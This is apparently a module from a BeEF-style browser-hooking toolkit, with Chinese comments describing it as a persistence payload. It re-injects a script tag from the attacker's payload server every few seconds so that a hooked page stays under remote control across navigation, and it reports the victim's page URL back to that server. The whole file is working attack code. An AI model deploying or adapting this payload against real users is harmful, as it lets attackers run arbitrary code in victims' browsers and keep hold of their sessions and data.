// MODULE = {"desc": "持久化:定时重新注入反连 script,页面跳转/刷新后保持 hook(BeEF persistence)", "category": "持久化", "params": [["interval", "重注入间隔ms,默认 5000"], ["module", "反连模块名,默认 hello"]]}
(function () {
  var iv = parseInt(_q("interval", "{{interval}}"), 10) || 5000;
  var mod = _q("module", "{{module}}") || "hello";
  var url = SERVER + "{{config.route_payload}}?m=" + encodeURIComponent(mod);
  function reinject() {
    try {
      if (!document.getElementById('fs3-hook')) {
        var s = document.createElement('script');
        s.id = 'fs3-hook';
        s.src = url + '&_r=' + Math.random();
        (document.body || document.documentElement).appendChild(s);
      }
    } catch (e) {}
  }
  reinject();
  setInterval(reinject, iv);
  report({ type: "persist", url: location.href, module: mod, interval: iv });
})();
